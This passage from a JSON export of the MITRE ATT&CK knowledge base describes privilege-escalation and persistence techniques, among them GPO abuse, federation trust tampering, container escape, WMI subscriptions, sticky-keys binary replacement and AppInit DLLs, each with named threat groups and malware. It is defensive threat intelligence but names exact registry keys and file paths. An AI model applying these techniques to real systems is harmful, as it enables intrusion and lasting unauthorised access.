<GPO_PATH>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <GPO_PATH>\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.", "id": "T1484.001", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware."}, {"id": "G0096", "name": "APT41", "description": "APT41 used scheduled tasks created via Group Policy Objects (GPOs) to deploy ransomware."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has used Group Policy to deploy batch scripts for ransomware deployment."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can modify the GPO to evade detection. "}, {"id": "S0363", "name": "Empire", "description": "Empire can use New-GPOImmediateTask to modify a GPO that will install and execute a malicious Scheduled Task/Job."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to deploy through an infected system's default domain policy."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used Group Policy Objects to deploy batch scripts."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can use group policy to push a scheduled task from the AD to all network machines."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller."}]}, {"name": "Trust Modification", "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.", "detailed_description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant. This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.", "id": "T1484.002", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant. AADInternals can also modify DesktopSSO information."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider adds a federated identity provider to the victim\u2019s SSO tenant and activates automatic account linking."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 changed domain federation trust settings using Azure AD administrative permissions to configure the domain to accept authorization tokens signed by their own SAML signing certificate."}]}]}, {"name": "Escape to Host", "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.", "detailed_description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as unshare and keyctl to escalate privileges and steal secrets.\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as docker.sock, to break out of the container via a Container Administration Command. Adversaries may also escape via Exploitation for Privilege Escalation, such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.", "id": "T1611", "examples": [{"id": "S0600", "name": "Doki", "description": "Doki\u2019s container was configured to bind the host root directory."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has used the BOtB tool that can break out of containers. "}, {"id": "S0683", "name": "Peirates", "description": "Peirates can gain a reverse shell on a host node by mounting the Kubernetes hostPath."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape maps the host\u2019s C drive to the container by creating a global symbolic link to the host through the calling of NtSetInformationSymbolicLink."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has deployed privileged containers that mount the filesystem of victim machine."}], "sub_techniques": []}, {"name": "Event Triggered Execution", "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.", "detailed_description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.", "id": "T1546", "examples": [{"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity involves managing events on victim systems via libevent to execute a callback function when any running process contains the following references in their path without also having a reference to bioset: busybox, wget, curl, tftp, telnetd, or lua. If the bioset string is not found, the related process is terminated."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups."}], "sub_techniques": [{"name": "Change Default File Association", "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nSystem file associations are listed under HKEY_CLASSES_ROOT.[extension], for example HKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\\[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command. For example:\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.", "id": "T1546.001", "examples": [{"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has a HWP document stealer module which changes the default program association in the registry to open HWP documents."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can conduct an image hijack of an .msc file extension as part of its UAC bypass process."}]}, {"name": "Screensaver", "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in C:\\Windows\\System32\\, and C:\\Windows\\sysWOW64\\  on 64-bit Windows systems, along with screensavers included with base Windows installations.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in C:\\Windows\\System32\\, and C:\\Windows\\sysWOW64\\  on 64-bit Windows systems, along with screensavers included with base Windows installations.\nThe following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.", "id": "T1546.002", "examples": [{"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence through the system screensaver by configuring it to execute the malware."}]}, {"name": "Windows Management Instrumentation Event Subscription", "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.", "detailed_description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts \u2013 using mofcomp.exe  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.", "id": "T1546.003", "examples": [{"id": "S0202", "name": "adbupd", "description": "adbupd can use a WMI script to achieve persistence."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used WMI event subscriptions for persistence."}, {"id": "G0064", "name": "APT33", "description": "APT33 has attempted to use WMI event subscriptions to establish persistence on compromised hosts."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use WMI event subscriptions for persistence."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used WMI event subscriptions for persistence."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used WMI event subscriptions for persistence."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT can use WMI event subscriptions to create persistence."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can compile randomly-generated MOF files into the WMI repository to persistently run malware."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used WMI for persistence."}, {"id": "G1013", "name": "Metador", "description": "Metador has established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such as cdb.exe."}, {"id": "S1059", "name": "metaMain", "description": "metaMain registered a WMI event subscription consumer called \"hard_disk_stat\" to establish persistence."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence."}, {"id": "C0023", "name": "Operation Ghost", "description": "During Operation Ghost, APT29 used WMI event subscriptions to establish persistence for malware."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has the ability to persist on a system using WMI events."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY uses a WMI event subscription to establish persistence."}, {"id": "S0371", "name": "POWERTON", "description": "POWERTON can use WMI for persistence."}, {"id": "G0075", "name": "Rancor", "description": "Rancor has complied VBScript-generated MOF files into WMI event subscriptions for persistence."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can use a WMI event filter to invoke a command-line event consumer to gain persistence."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can create a WMI Event to execute a payload for persistence."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with rundll32.exe."}, {"id": "S0682", "name": "TrailBlazer", "description": "TrailBlazer has the ability to use WMI for persistence."}, {"id": "G0010", "name": "Turla", "description": "Turla has used WMI event filters and consumers to establish persistence."}]}, {"name": "Unix Shell Configuration Modification", "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.", "detailed_description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session.\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.", "id": "T1546.004", "examples": [{"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can establish persistence on a compromised host through modifying the profile, login, and run command (rc) files associated with the bash, csh, and tcsh shells. "}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit maintains persistence on an infected machine through rc.local and .bashrc files. "}, {"id": "S1078", "name": "RotaJakiro", "description": "When executing with non-root level permissions, RotaJakiro can install persistence by adding a command to the .bashrc file that executes a binary in the  ${HOME}/.gvfsd/.profile/ folder."}]}, {"name": "Trap", "description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.", "id": "T1546.005", "examples": []}, {"name": "LC_LOAD_DYLIB Addition", "description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.\nAdversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time.", "id": "T1546.006", "examples": []}, {"name": "Netsh Helper DLL", "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\\SOFTWARE\\Microsoft\\Netsh.\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.", "id": "T1546.007", "examples": [{"id": "S0108", "name": "netsh", "description": "netsh can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed."}]}, {"name": "Accessibility Features", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\nTwo common accessibility programs are C:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times and C:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen.\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP).  The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges.\nOther accessibility features exist that may also be leveraged in a similar fashion:", "id": "T1546.008", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 used sticky-keys to obtain unauthenticated, privileged console access."}, {"id": "G0022", "name": "APT3", "description": "APT3 replaces the Sticky Keys binary C:\\Windows\\System32\\sethc.exe for persistence."}, {"id": "G0096", "name": "APT41", "description": "APT41 leveraged sticky keys to establish persistence."}, {"id": "G0001", "name": "Axiom", "description": "Axiom actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence."}, {"id": "G0009", "name": "Deep Panda", "description": "Deep Panda has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions."}, {"id": "S0363", "name": "Empire", "description": "Empire can leverage WMI debugging to remotely replace binaries like sethc.exe, Utilman.exe, and Magnify.exe with cmd.exe."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used sticky keys to launch a command prompt."}]}, {"name": "AppCert DLLs", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. ", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. \nSimilar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.", "id": "T1546.009", "examples": [{"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can establish using a AppCertDLLs Registry key."}]}, {"name": "AppInit DLLs", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. ", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows or HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. \nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.  Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.", "id": "T1546.010", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows in order to establish persistence."}, {"id": "S0107", "name": "Cherry Picker", "description": "Some variants of Cherry Picker use AppInit_DLLs to achieve persistence by creating the following Registry key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows \"AppInit_DLLs\"=\"pserver32.dll\""}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can insert itself into the address space of other applications using the AppInit DLL Registry key."}, {"id": "S0098", "name": "T9000", "description": "If a victim meets certain criteria, T9000 uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs \u2013 %APPDATA%\\Intel\\ResN32.dll and HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs \u2013 0x1."}]}, {"name": "Application Shimming", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. ", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\nCustom databases are stored in:\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs.", "id": "T1546.011", "examples": [{"id": "G0046", "name": "FIN7", "description": "FIN7 has used application shim databases for persistence."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has used a malicious shim database to maintain persistence."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has installed shim databases in the AppPatch folder."}]}, {"name": "Image File Execution Options Injection", "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., C:\\dbg\\ntsd.exe -g  notepad.exe). ", "detailed_description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., C:\\dbg\\ntsd.exe -g  notepad.exe). \nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  IFEOs are represented as Debugger values in the Registry under HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ where <executable> is the binary on which the debugger is attached.\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).   Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\.\nSimilar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges.\nSimilar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\nMalware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.", "id": "T1546.012", "examples": [{"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles modified and added entries within HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options to maintain persistence."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST created an Image File Execution Options (IFEO) Debugger registry value for the process dllhost.exe to trigger the installation of Cobalt Strike."}]}, {"name": "PowerShell Profile", "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.", "detailed_description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.\nPowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the -NoProfile flag is used when it is launched.\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.", "id": "T1546.013", "examples": [{"id": "G0010", "name": "Turla", "description": "Turla has used PowerShell profiles to maintain persistence on an infected machine."}]}, {"name": "Emond", "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.", "detailed_description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system 